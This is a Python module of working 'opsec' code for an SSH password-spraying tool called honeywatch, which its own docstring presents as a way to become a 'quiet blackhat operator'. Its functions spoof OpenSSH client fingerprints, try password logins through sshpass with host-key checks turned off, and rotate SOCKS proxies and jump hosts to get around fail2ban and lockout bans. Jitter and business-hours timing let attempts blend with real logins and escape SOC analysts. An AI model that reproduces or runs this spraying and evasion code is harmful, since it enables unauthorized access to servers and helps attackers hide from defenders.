"""Opsec primitives for honeywatch online operations.

This module is the tradecraft layer the cracker/sprayer sit on top of. Every
primitive here is grounded in public defensive research -- the point is to
move honeywatch from "loud red-team scanner" to "quiet blackhat operator"
without lying about what is and isn't evadable.

Threat model this module mitigates (with sources):

- **HASSH / JA4SSH client fingerprinting.** The client's KEXINIT algorithm
  set (kex / host-key / cipher / mac / compression) is itself an MD5/SHA-256
  fingerprint. Salesforce HASSH explicitly lists paramiko, Meterpreter, and
  Empire as lateral-movement indicators. Spoofing only the version string
  (``SSH-2.0-OpenSSH_...``) does NOT change the algorithm fingerprint.
  Mitigation: drive the real system ``ssh`` client (``sshpass``) so the
  KEXINIT is genuinely OpenSSH. paramiko stays as the no-extra-deps fallback
  and is flagged as higher-risk by :data:`PARAMIKO_HASSH_RISK`.

- **fail2ban / SSHGuard / CrowdSec rate bans + recidive.** A steady spray
  from one IP trips ``maxretry`` inside ``findtime`` and gets banned for
  ``bantime``; recidive jails then re-ban repeat offenders for 7-30 days.
  Mitigation: low-and-slow timing, jitter, lockout-delay backoff, and
  per-attempt source-IP rotation (TREVORspray / CredMaster pattern).

- **Account lockout (AD / PAM).** Grid spraying (users x passwords) trips
  lockout thresholds fast. Mitigation: lockout-aware *spray* (one password
  across many users) with a per-password cooldown.

- **SOC analyst attention.** Off-hours auth bursts are the loudest signal an
  analyst hunts. Mitigation: business-hours window so auth noise blends with
  organic login traffic (CredMaster "WeekdayWarrior").

- **Wasted noise on publickey-only hosts.** Spraying a box that doesn't
  offer ``password`` auth is pure log pollution. Mitigation: an auth-method
  precheck that skips hosts advertising only ``publickey``.

This module never raises; every primitive returns a structured outcome so the
cracker/sprayer can render results without try/except ladders.
"""

from __future__ import annotations

import random
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Iterable

__all__ = [
    "AuthMethods",
    "LoginAttempt",
    "PARAMIKO_HASSH_RISK",
    "ProxyPool",
    "attempt_sshpass",
    "auth_methods",
    "jitter_delay",
    "within_business_hours",
]


# Documented residual risk: paramiko's KEXINIT algorithm set is a distinct
# HASSH that defenders flag as an automation/lateral-movement indicator
# (Salesforce HASSH). We use the system ssh client when available to emit a
# genuine OpenSSH HASSH; paramiko is the fallback and inherits this risk.
PARAMIKO_HASSH_RISK = (
    "paramiko KEXINIT is a distinctive HASSH fingerprint defenders flag as "
    "automation tooling; install sshpass+openssh and use the ssh backend for a "
    "genuine OpenSSH client fingerprint"
)


# --------------------------------------------------------------------------- #
# Timing
# --------------------------------------------------------------------------- #


def within_business_hours(
    now: datetime | None = None,
    start_h: int = 8,
    end_h: int = 18,
    weekdays_only: bool = True,
) -> bool:
    """True when ``now`` falls inside a business-hours window.

    Defaults to 08:00-18:00 Mon-Fri -- the window where organic auth traffic
    is highest and an extra spray blends with real user logins rather than
    standing out as an off-hours spike. ``start_h``/``end_h`` are local hours.
    """
    now = now or datetime.now()
    if weekdays_only and now.weekday() >= 5:  # 5=Sat, 6=Sun
        return False
    return start_h <= now.hour < end_h


def jitter_delay(base: float, jitter: float, rng: random.Random | None = None) -> float:
    """Return ``base`` plus up to ``jitter`` seconds of uniform random delay.

    A flat, deterministic inter-attempt delay is itself a signature; jitter
    spreads attempts across a natural-looking distribution so rate-based
    IDS thresholds (fail2ban ``findtime`` windows) are harder to trip.
    """
    if jitter <= 0:
        return max(0.0, base)
    rng = rng or random
    return max(0.0, base + rng.uniform(0.0, jitter))


# --------------------------------------------------------------------------- #
# Source rotation
# --------------------------------------------------------------------------- #


@dataclass
class ProxyPool:
    """Round-robin source-rotation selector (TREVORspray / CredMaster pattern).

    Holds a list of proxy specs (``socks5://[user:pass@]host:port``) and/or
    SSH jump hosts (``user@host``). :meth:`next` returns the next one in
    rotation so successive login attempts egress from different source IPs,
    defeating per-IP fail2ban thresholds. A single Mullvad exit sprayed at
    planet scale gets globally banned in hours; a rotating pool survives.

    Empty pool -> :meth:`next` returns ``None`` (use the direct egress IP).
    """

    proxies: list[str] = field(default_factory=list)
    jumps: list[str] = field(default_factory=list)
    _i: int = 0

    @classmethod
    def from_files(
        cls,
        proxy_file: str | None = None,
        jump_file: str | None = None,
    ) -> "ProxyPool":
        proxies: list[str] = []
        jumps: list[str] = []
        if proxy_file:
            proxies = _read_lines(proxy_file)
        if jump_file:
            jumps = _read_lines(jump_file)
        return cls(proxies=proxies, jumps=jumps)

    def __bool__(self) -> bool:
        return bool(self.proxies or self.jumps)

    def next(self) -> dict[str, str | None]:
        """Return the next rotation target as a dict, or empty for direct."""
        items: list[tuple[str, str]] = []
        for p in self.proxies:
            items.append(("proxy", p))
        for j in self.jumps:
            items.append(("jump", j))
        if not items:
            return {"proxy": None, "jump": None}
        kind, value = items[self._i % len(items)]
        self._i += 1
        return {"proxy": value if kind == "proxy" else None,
                "jump": value if kind == "jump" else None}


def _read_lines(path: str) -> list[str]:
    out: list[str] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except OSError:
        return []
    return out


# --------------------------------------------------------------------------- #
# Auth-method enumeration (the "don't spray publickey-only boxes" precheck)
# --------------------------------------------------------------------------- #


@dataclass
class AuthMethods:
    ip: str
    port: int
    user: str
    methods: list[str] = field(default_factory=list)
    offers_password: bool = False
    error: str | None = None


def auth_methods(
    ip: str, port: int, user: str, timeout_s: float = 6.0
) -> AuthMethods:
    """Enumerate the auth methods a server offers for ``user``.

    Uses paramiko's ``auth_none`` (which raises with the
    ``allowed_auths`` list) when paramiko is present, falling back to the
    system ``ssh -o PreferredAuthentications=none`` debug parse otherwise.
    Never raises; the outcome is in :class:`AuthMethods`.

    A host advertising only ``publickey`` is skipped by the sprayer -- there
    is no point (and a lot of log noise) spraying passwords at a box that
    cannot accept them.
    """
    res = AuthMethods(ip=ip, port=port, user=user)
    try:
        import paramiko  # type: ignore[import-not-found]
        import socket as _socket

        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        t = paramiko.Transport(sock)
        try:
            t._CLIENT_IDENTITY = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
        except Exception:
            pass
        t.local_version = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
        t.start_client(timeout=timeout_s)
        try:
            t.auth_none(user)
            # Some servers accept none-auth (rare); treat as offers_password=False.
            res.methods = []
        except paramiko.BadAuthenticationType as exc:
            # exc.allowed_types or str(exc) carries the allowed auths list.
            allowed = getattr(exc, "allowed_types", None)
            if not allowed:
                allowed = _parse_allowed(str(exc))
            res.methods = list(allowed or [])
        except Exception as exc:
            res.error = f"{type(exc).__name__}: {exc}"
        else:
            pass
        res.offers_password = "password" in res.methods
    except Exception as exc:
        res.error = f"{type(exc).__name__}: {exc}"
    finally:
        try:
            t.close()
        except Exception:
            pass
    return res


def _parse_allowed(text: str) -> list[str]:
    """Pull the 'Authentications that can continue: a, b, c' list out of text."""
    marker = "can continue:"
    idx = text.lower().find(marker)
    if idx == -1:
        return []
    rest = text[idx + len(marker):]
    # take up to the next quote/bracket
    for stop in ('"', "'", "]"):
        j = rest.find(stop)
        if j != -1:
            rest = rest[:j]
    return [m.strip() for m in rest.split(",") if m.strip()]


# --------------------------------------------------------------------------- #
# sshpass + OpenSSH login attempt (genuine OpenSSH HASSH, no paramiko KEXINIT)
# --------------------------------------------------------------------------- #


@dataclass
class LoginAttempt:
    user: str
    password: str
    success: bool = False
    error: str | None = None
    backend: str = "sshpass"
    source: str | None = None  # proxy/jump used, for audit


def attempt_sshpass(
    ip: str,
    port: int,
    user: str,
    password: str,
    timeout_s: float = 15.0,
    proxy: str | None = None,
    jump: str | None = None,
    ssh_bin: str = "ssh",
    sshpass_bin: str = "sshpass",
) -> LoginAttempt:
    """One login attempt via the real OpenSSH client + sshpass.

    This is the high-opsec backend: the KEXINIT the server sees is the genuine
    OpenSSH algorithm set (a real HASSH), not paramiko's, so HASSH/JA4SSH
    detectors do not flag it as automation tooling. The password is passed
    via an env var (``SSHPASS``) so it never appears in argv / process
    listings.

    ``proxy`` is a ``socks5://[user:pass@]host:port`` spec wired in via ssh's
    ``ProxyCommand`` (uses ``nc -X 5 -x``); ``jump`` is a ``user@host`` SSH
    jump wired via ``ProxyJump``. Either rotates the egress source IP.

    Returns a :class:`LoginAttempt`; never raises.
    """
    attempt = LoginAttempt(user=user, password=password, backend="sshpass",
                           source=proxy or jump)
    env = {"SSHPASS": password}
    argv = [sshpass_bin, "-e", ssh_bin,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            "-o", f"ConnectTimeout={int(max(1, timeout_s))}",
            "-o", "NumberOfPasswordPrompts=1",
            "-p", str(port)]
    if jump:
        argv += ["-o", f"ProxyJump={jump}"]
    if proxy:
        argv += ["-o", f"ProxyCommand=nc -X 5 -x {proxy[len('socks5://'):] if proxy.startswith('socks5://') else proxy} %h %p"]
    argv += [f"{user}@{ip}", "exit"]
    try:
        proc = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout_s * 2 + 5,
            env={**__import__("os").environ, **env},
        )
    except FileNotFoundError as exc:
        attempt.error = f"backend missing: {exc.filename or exc}"
        return attempt
    except subprocess.TimeoutExpired:
        attempt.error = "timeout"
        return attempt
    except Exception as exc:  # pragma: no cover - defensive
        attempt.error = f"{type(exc).__name__}: {exc}"
        return attempt

    rc = proc.returncode
    # ssh returns 0 on a successful login+exec; 5 on a bad password
    # (SSH_ERR_PERMISSION_DENIED); other codes are transport errors.
    if rc == 0:
        attempt.success = True
    elif rc == 5:
        attempt.success = False
    else:
        # Distinguish a ban/reset (rc 255 + "Connection closed"/"refused") so
        # the caller can back off + rotate.
        err = (proc.stderr or "").strip()
        low = err.lower()
        if "refused" in low or "reset by peer" in low or "closed" in low:
            attempt.error = f"transport({rc}): {err[:160]}"
        else:
            attempt.error = f"ssh rc={rc}: {err[:160]}"
    return attempt


def sleep_with_jitter(base: float, jitter: float, rng: random.Random | None = None) -> float:
    """Sleep for a jittered delay and return how long we slept."""
    d = jitter_delay(base, jitter, rng)
    if d > 0:
        time.sleep(d)
    return d